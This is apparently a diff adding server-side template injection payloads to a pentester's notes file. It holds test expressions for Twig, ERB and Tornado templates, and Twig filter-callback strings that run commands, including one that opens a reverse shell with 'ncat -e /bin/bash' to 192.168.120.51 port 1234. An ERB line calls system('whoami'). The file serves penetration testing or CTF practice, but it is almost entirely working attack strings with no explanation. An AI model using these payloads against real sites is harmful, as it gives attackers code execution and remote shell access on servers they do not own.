@@ -1,3 +1,13 @@
+#!/usr/bin/peno
+
+{7*7}
+{{7*7}}
+{{7*'7'}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("ncat -e /bin/bash 192.168.120.51 1234")}}
+
 <%= 7*7 %>											//ERB template
 <%= system("whoami") %>										//ERB template
 blog-post-author-display=user.name}}{{7*7}}							//Tornado template
